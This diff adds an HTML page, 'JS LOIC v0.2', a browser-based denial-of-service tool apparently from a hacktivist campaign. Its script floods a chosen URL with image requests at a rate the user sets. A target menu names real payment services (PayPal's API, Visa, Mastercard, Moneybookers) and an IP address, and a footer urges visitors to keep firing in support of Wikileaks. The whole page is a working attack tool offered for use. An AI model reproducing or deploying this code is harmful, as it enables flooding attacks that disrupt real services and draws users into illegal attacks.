@@ -1,0 +1,232 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>JS LOIC v0.2</title>
+    <style type="text/css" >
+    body {
+        
+        width:100%;
+        margin:auto;
+        background-color:#B7CC1E; 
+        color:#FFFFFF;
+        font-family:Verdana, Geneva, sans-serif;
+    }
+    #p1{
+     width:240px; 
+     height:100px; 
+     position:absolute;
+     left:500px;
+    }
+    #img {
+        width:490px;
+        height:331px; 
+        position:absolute;
+    }
+    
+    #header {
+    width:900px;
+    margin:auto;    
+    }
+        
+    #wrapper {
+    position:absolute;
+    width:100%;      
+    height:100%;
+    background-color: #1E4964;    
+    margin:auto;
+        }
+    #p2 {
+    width:240px;
+    height:100px; 
+    position:absolute; 
+    left:780px;    
+    }
+    #fireButton {
+    background-image:url(/btnl.jpg);
+    }
+    </style>
+</head>
+<body>
+
+ <div id="header">
+<h1><abbr title="JavaScript">JS</abbr> <abbr title="Low Orbit Ion Cannon">LOIC</abbr> v 0.2</h1>
+
+<h2 style="font-size:15px;">CLICK THE BUTTON AND WAIT</h2>
+  </div>
+  
+  
+  
+  
+ 
+<div id="wrapper">
+
+
+<div id="table" >
+
+
+<div  id="img">
+  <img alt="LOIC" 
+  src="images/loop.png" />
+</div>
+
+<div id="p1">
+
+     <fieldset style="width:100%; height:100%; border:none;">
+        <label>Step 1. Select your target:</label>
+        <label>URL: <br /> 
+        
+        <select name="targetURL" id="targetURL" style="width:100%;">
+        <option>72.52.0.65</option>
+          <option>http://www.moneybookers.com:80/</option>
+
+          <option>http://api.paypal.com:443/</option>
+          <option>http://verified.visa.com:80/</option>
+          <option>http://www.mastercard.com:80/</option>
+        </select>
+      </label>
+        <small>For current target see: <a href="http://anonops.eu/" style="color:#FFF;">http://anonops.eu/</a></small>
+
+    </fieldset>
+</div>
+
+
+
+<div id="p2" >
+     <fieldset style="width:100%; height:100%; border:none;">
+       <label>Step 2. Ready?</label>
+        <button id="fireButton" style="border:none; color:#FFFFFF; width:240px; height:70px;">IMMA CHARGING MAH LAZER</button>
+    </fieldset>
+
+</div>
+
+
+
+<div id="p3" style="width:240px; height:160px; position:absolute; left:500px; top:150px;">
+     <fieldset style="width:100%; height:100%; border:none;">
+        <label>Message And Speed</label>
+        Step 2. if desired slelect speed and msg
+         <label>Requests per second: <input id="rps" style="width:40px;" value="100" /></label><br />
+         <label>Append message: <br /><input id="message" style="width:100%;" value="BOOM HEADSHOT!" /></label>
+
+    </fieldset>
+</div>
+
+
+<div id="p4" style="width:240px; height:160px;  position:absolute; left:780px; top:150px;">
+     <fieldset style="width:100%; height:100%; border:none;">
+         <label>Attack status:</label>
+        <dl>
+            <dt>Requested:</dt>
+
+            <dd id="requestedCtr">0</dd>
+
+            <dt style="opacity: 0.5">Succeeded:</dt>
+
+            <dd style="opacity: 0.5" id="succeededCtr">0</dd>
+            <dt style="opacity: 0.5">Failed:</dt>
+            <dd style="opacity: 0.5" id="failedCtr">0</dd>
+
+        </dl>
+    </fieldset>
+
+</div>
+
+
+
+<div id="footer" style="width:900px; height:160px; font-size:14px; position:absolute; top:350px;">
+We need your help in support of <a href="http://wikileaks.ch/" style="color:#FFF">wikileaks</a> leave this page firing as long as you can.  Don't worry if requests show as failed.
+
+</div>
+
+</div> 
+
+</div>
+
+    <script>
+        (function () {
+
+            var fireInterval;
+            var isFiring = false;
+
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+                succeededCtrNode = document.getElementById("succeededCtr"),
+                failedCtrNode = document.getElementById("failedCtr"),
+                targetURLNode = document.getElementById("targetURL"),
+                fireButton = document.getElementById("fireButton"),
+                messageNode = document.getElementById("message"),
+                rpsNode = document.getElementById("rps"),
+                timeoutNode = document.getElementById("timeout");
+
+            var targetURL = targetURLNode.value;
+            targetURLNode.onchange = function () {
+                targetURL = this.value;
+            };
+
+            var requestsHT = {}; // requests hash table, may come in handy later
+
+            var requestedCtr = 0,
+                succeededCtr = 0,
+                failedCtr = 0;
+
+            var makeHttpRequest = function () {
+                
+                    if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests
+                        return;
+                    };
+                    
+                    var rID =Number(new Date());
+                    var img = new Image();
+                    img.onerror = function () { onFail(rID); };
+                    img.onabort = function () { onFail(rID); };
+                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+                    
+                    img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                    requestsHT[rID] = img;
+                    onRequest(rID);
+                };
+
+            var onRequest = function (rID) {
+                    requestedCtr++;
+                    requestedCtrNode.innerHTML = requestedCtr;
+                };
+
+            var onComplete = function (rID) {
+                    delete requestsHT[rID];
+                };
+
+            var onFail = function (rID) {
+                   // failedCtr++;
+                    //failedCtrNode.innerHTML = failedCtr;
+                    
+                    succeededCtr++; //Seems like the url will always fail it it isn't an image
+                    succeededCtrNode.innerHTML = succeededCtr;
+
+
+                    delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
+                };
+
+            var onSuccess = function (rID) {
+                    succeededCtr++;
+                    succeededCtrNode.innerHTML = succeededCtr;
+                    delete requestsHT[rID];
+                };
+
+            fireButton.onclick = function () {
+                if (isFiring) {
+                    clearInterval(fireInterval);
+
+                    isFiring = false;
+                    this.innerHTML = "IMMA CHARGING MAH LAZER";
+                } else {
+                    isFiring = true;
+                    this.innerHTML = "Stop flooding";
+
+                    fireInterval = setInterval(makeHttpRequest, (2500 / parseInt(rpsNode.value) | 0));
+                }
+            };
+
+        })();
+    </script>
+http://anonspain.blogspot.es
+</body>
+</html>
